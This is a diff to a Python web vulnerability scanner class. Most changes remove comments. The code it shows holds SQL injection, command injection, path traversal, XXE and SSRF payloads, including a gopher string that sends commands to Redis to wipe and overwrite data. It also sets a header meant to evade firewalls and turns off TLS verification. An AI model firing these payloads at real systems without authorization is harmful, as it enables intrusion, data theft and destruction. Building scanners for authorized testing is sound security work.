@@ -19,12 +19,11 @@ class WebInspector:
         self.response: Optional[requests.Response] = None
         self.log_queue: List[str] = []
         
-        # Configure headers
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Accept-Language": "en-US,en;q=0.5",
-            "X-Scanner": "SecurityAudit/1.0",  # Ethical header
-            "Safe-Mode": "true"  # Fake header to avoid WAF triggers
+            "X-Scanner": "SecurityAudit/1.0", 
+            "Safe-Mode": "true"
         }
 
     def _log(self, message: str):
@@ -141,7 +140,6 @@ class WebInspector:
         """Comprehensive vulnerability checks covering OWASP Top 10"""
         self._log("Starting advanced vulnerability assessment...")
         
-        # Define common vulnerable endpoints
         test_endpoints = [
             "/.git/config",
             "/.env",
@@ -151,7 +149,6 @@ class WebInspector:
             "/wp-login.php"
         ]
         
-        # Test SQL Injection with multiple vectors
         sqli_payloads = [
             ("'", "SQL syntax"),
             ("1' OR 1=1--", "WHERE clause"),
@@ -179,34 +176,33 @@ class WebInspector:
             "$(ping%20-c%201%20127.0.0.1)"
         ]
         
-        # Test path traversal patterns
+        # test path traversal patterns
         traversal_payloads = [
             "../../../../etc/passwd",
             "%2e%2e%2fetc%2fpasswd",
             "..%5c..%5cwindows%5cwin.ini"
         ]
         
-        # Test SSRF patterns
+        # test SSRF patterns
         ssrf_payloads = [
             "http://169.254.169.254/latest/meta-data/",
             "file:///etc/passwd",
             "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0aset 1 0 3600 24%0d%0aMASTERHOST 127.0.0.1%0d%0aMASTERPORT 6379%0d%0a%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
         ]
         
-        # Test XXE payloads
+        # test XXE payloads
         xxe_payload = '''<?xml version="1.0"?>
         <!DOCTYPE root [
         <!ENTITY xxe SYSTEM "file:///etc/passwd">
         ]>
         <root>&xxe;</root>'''
         
-        # Test insecure deserialization
+        # test insecure deserialization
         deserialization_payloads = {
             'java': r"\xac\xed\x00\x05",  # Java serialized magic bytes
             'python': b"\x80\x04\x95\x23\x00\x00\x00\x00\x00\x00\x00"  # Pickle magic
         }
         
-        # 1. Check common sensitive endpoints
         self._log("\n[+] Checking sensitive endpoints")
         for endpoint in test_endpoints:
             try:
@@ -216,7 +212,6 @@ class WebInspector:
             except Exception as e:
                 continue
         
-        # 2. Enhanced SQL Injection checks
         self._log("\n[+] Performing SQLi testing")
         for payload, indicator in sqli_payloads:
             try:
@@ -230,7 +225,6 @@ class WebInspector:
             except Exception as e:
                 continue
         
-        # 3. Advanced XSS testing
         self._log("\n[+] Performing XSS testing")
         forms = self.site_html.find_all('form') if self.site_html else []
         for form in forms:
@@ -249,7 +243,6 @@ class WebInspector:
                     except Exception as e:
                         continue
         
-        # 4. Command Injection testing
         self._log("\n[+] Testing command injection")
         for payload in cmd_payloads:
             try:
@@ -260,7 +253,6 @@ class WebInspector:
             except Exception as e:
                 continue
         
-        # 5. Path Traversal testing
         self._log("\n[+] Testing path traversal")
         for payload in traversal_payloads:
             try:
@@ -271,7 +263,6 @@ class WebInspector:
             except Exception as e:
                 continue
         
-        # 6. XXE testing
         self._log("\n[+] Testing XXE vulnerabilities")
         try:
             resp = self.session.post(
@@ -284,7 +275,6 @@ class WebInspector:
         except Exception as e:
             pass
         
-        # 7. Insecure deserialization
         self._log("\n[+] Testing insecure deserialization")
         for lang, payload in deserialization_payloads.items():
             try:
@@ -370,11 +360,10 @@ class WebInspector:
                         headers=self.headers,
                         timeout=7,
                         allow_redirects=True,
-                        stream=False  # Faster for header-only checks
+                        stream=False
                     ) as response:
                         response_time = time.time() - start_time
                         
-                        # Thread-safe logging
                         with threading.Lock():
                             self._log(
                                 f"TRY: {path.ljust(20)} | "
@@ -393,20 +382,17 @@ class WebInspector:
         try:
             with open(path_file, 'r') as f:
                 paths = [line.strip() for line in f if line.strip()]
-                
-                # Create thread-safe queue
+                #THREAD QUE
                 path_queue = Queue()
                 for path in paths:
                     path_queue.put(path)
                     
-                # Create session for each thread
                 with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
                     futures = []
                     for _ in range(thread_count):
-                        # Create individual session for each thread
                         session = requests.Session()
                         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
-                        session.verify = False # Insecure SSL Header (vulnerable to MITM)
+                        session.verify = False
                         session.headers.update(self.headers)
                         
                         futures.append(
@@ -417,7 +403,6 @@ class WebInspector:
                             )
                         )
                     
-                    # Wait for all tasks to complete
                     concurrent.futures.wait(futures)
                     
             self._log(f"Traversal completed with {len(paths)} paths checked")
